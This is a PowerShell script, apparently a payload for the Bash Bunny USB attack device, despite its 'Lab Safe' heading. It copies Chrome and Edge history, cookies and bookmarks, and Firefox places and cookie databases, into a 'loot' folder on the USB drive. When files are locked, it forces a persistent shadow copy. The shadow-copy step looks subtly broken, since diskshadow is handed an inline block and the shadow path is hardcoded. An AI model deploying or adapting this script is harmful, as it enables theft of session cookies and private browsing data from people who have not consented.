#############################################
#  Browser Artifact Collector (Lab Safe)
#  Saves directly to Bash Bunny loot folder
#############################################

# --- Detect Bash Bunny drive ---
$usb = Get-WmiObject Win32_LogicalDisk |
    Where-Object {
        $_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
    } |
    Select-Object -ExpandProperty DeviceID

if (-not $usb) {
    Write-Output "[-] Bash Bunny drive not found."
    exit
}

Write-Output "[+] Bash Bunny detected on $usb"

# --- Set loot directory ---
$loot = "$usb\loot\browser_artifacts"
New-Item -ItemType Directory -Force -Path $loot | Out-Null
Write-Output "[+] Loot folder: $loot"


#############################################
#   Function: Safe Copy (shadow-copy fallback)
#############################################

function Copy-Safe {
    param($source, $dest)

    try {
        Copy-Item $source $dest -ErrorAction Stop
        return
    } catch {
        # Try shadow-copy fallback
        Write-Output "[-] Normal copy failed for $source, attempting shadow copy..."

        diskshadow /s {
            SET CONTEXT PERSISTENT
            BEGIN BACKUP
            ADD VOLUME C: ALIAS vol1
            CREATE
            END BACKUP
        } | Out-Null

        $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
        $fullPath = $source.Replace("C:", $shadowPath)

        try {
            Copy-Item $fullPath $dest -Force
            Write-Output "[+] Shadow copy successful for: $source"
        } catch {
            Write-Output "[-] Shadow copy failed for: $source"
        }
    }
}


#############################################
#          Chrome Collection
#############################################

$chromePaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
)

$chromeDest = "$loot\Chrome"
New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null

foreach ($path in $chromePaths) {
    if (Test-Path $path) {
        Copy-Safe $path $chromeDest
    }
}


#############################################
#              Edge Collection
#############################################

$edgePaths = @(
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
)

$edgeDest = "$loot\Edge"
New-Item -ItemType Directory -Force -Path $edgeDest | Out-Null

foreach ($path in $edgePaths) {
    if (Test-Path $path) {
        Copy-Safe $path $edgeDest
    }
}


#############################################
#             Firefox Collection
#############################################

$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
$ffDest  = "$loot\Firefox"

if (Test-Path $ffBase) {
    New-Item -ItemType Directory -Force -Path $ffDest | Out-Null

    foreach ($profile in Get-ChildItem $ffBase) {
        $pDest = "$ffDest\$($profile.Name)"
        New-Item -ItemType Directory -Force -Path $pDest | Out-Null

        Copy-Safe "$($profile.FullName)\places.sqlite"  $pDest
        Copy-Safe "$($profile.FullName)\cookies.sqlite" $pDest
    }
}


#############################################
#                Done
#############################################

Write-Output "[+] Browser artifact collection complete."
